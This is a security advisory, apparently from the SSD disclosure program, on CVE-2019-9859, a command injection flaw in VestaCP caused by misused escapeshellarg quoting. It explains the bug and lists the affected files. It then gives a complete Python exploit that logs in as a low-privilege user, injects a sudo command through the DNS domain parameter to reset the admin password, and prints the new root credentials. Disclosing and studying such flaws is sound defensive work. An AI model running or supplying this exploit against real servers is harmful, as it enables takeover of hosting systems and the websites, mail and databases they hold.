**Vulnerabilities Summary**

The following advisory describes a vulnerability in Vesta control panel (VestaCP), an open source hosting control panel, which can be used to manage multiple websites, create and manage email accounts, FTP accounts, and MySQL databases, manage DNS records and more.

**CVE**

CVE-2019-9859

**Credit**

An independent Security Researcher, 0xecute, has reported this vulnerability to SSD Secure Disclosure program.

**Affected systems**

VestaCP versions 0.9.7-0.9.8-23.

**Vendor Response**

The vendor released a fixed version on April 15.
Vulnerability Details

VestaCP is vulnerable to an authenticated command execution which
can result a remote root access on the server.

The platform works with PHP as the frontend language and uses shell scripts to execute system actions. PHP executes shell script through the dangerous command `exec`. This function can be dangerous if arguments passed to it are not filtered. Every user input in VestaCP that is used as argument is filtered with the `escapeshellarg` function. This function comes from the php library directly and its description is as follow:

`escapeshellarg()` adds single quotes around a string and quotes/escapes any existing single quotes allowing you to pass a string directly to a shell function and having it be treated as a single safe argument. It means that if you give Username, it will be replaced with ‘Username’. This works well and protects users from exploiting this potentially dangerous exec function.

Unfortunately, VestaCP uses this escapeshellarg function wrong at several places. We can see an example in web\list\dns\index.php:

`exec (VESTA_CMD."v-list-dns-records '".$user."' '".escapeshellarg($_GET['domain'])."' 'json'", $output, $return_var);`

We can see the `escapeshellarg` use on the user input, but it is surrounded by single quote! If we remember the goal of `escapeshellarg`, it already adds a single quote around the input.

This error means that if we give an input with a space, we are not inside the second argument of the `v-list-dns-records` function and not surrounded by single quote anymore.

It will give for ``$_GET[‘domain’]=abc touch/tmp/hacked` the following
`Exec(v-list-dns-records ‘username’ ‘’abc touch /tmp/hacked)`` This will consider ‘’abc as the second argument, and `touch /tmp/hacked` will be executed as a system command as it is outside quotes.

This error can be found in the following files:
`web\edit\server\index.php : 4 times`

`web\list\dns\index.php: 1 time`

`web\list\mail\index.php: 1 time`

```python
import requests
from bs4 import BeautifulSoup
username='simpleUser'
password='welcome123'
serverIP='https://192.168.56.102:8083'
newRootPassword='welcomeRoot'
vestaPath='/usr/local/vesta'
cmd='sudo '+vestaPath+'/bin/v-change-user-password admin '+newRootPassword
s = requests.session()
r = s.get(serverIP+'/login/', verify=False)
soup = BeautifulSoup(r.text, features="html.parser")
token = soup.find('input', {'name': 'token'}).get('value')
print(token)
## Authentication ##
loginR = s.post(serverIP+"/login/", allow_redirects=False, data={'token':token,'user':username,'password':password},headers={'Referer':serverIP+'/login/','User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64;rv:65.0)Gecko/20100101 Firefox/65.0'}, verify=False)
if loginR.status_code!=302:
	print("Wrong login")
	print(loginR.text)
	print(loginR.status_code)
	print(loginR.headers)
	exit()
## Exploit ##
exploitR = s.get(serverIP+'/list/dns/index.php?domain=abc%20`'+cmd+'`')
if exploitR.status_code==200:
	print("Exploit done")
	print("You can now connect to the SSH server")
	print("Credentials: \nUsername: admin\nPassowrd: "+newRootPassword)
	print("Then, you need to execute 'sudo bash' and type again the password, then you
	are root")
```
